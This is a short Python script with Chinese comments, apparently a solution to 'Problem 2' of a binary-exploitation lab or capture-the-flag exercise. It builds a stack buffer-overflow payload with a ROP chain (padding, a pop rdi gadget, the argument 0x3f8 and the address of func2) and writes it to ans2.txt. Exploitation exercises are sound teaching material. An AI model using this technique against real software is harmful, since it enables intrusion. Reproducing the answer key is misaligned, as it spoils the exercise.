# Problem 2 自动化利用脚本
import struct

# 地址 (小端序 64位)
pop_rdi_ret = struct.pack("<Q", 0x4012c7)
func2_addr = struct.pack("<Q", 0x401216)
arg_val = struct.pack("<Q", 0x3f8)

# 构造 Payload
padding = b"A" * 16
# ROP Chain: 
# 1. 跳转到 pop rdi 指令
# 2. 栈上的 0x3f8 被 pop 到 rdi
# 3. ret 指令跳转到 func2
payload = padding + pop_rdi_ret + arg_val + func2_addr

# 写入文件
with open("ans2.txt", "wb") as f:
    f.write(payload)

print("Payload for Problem 2 written to ans2.txt")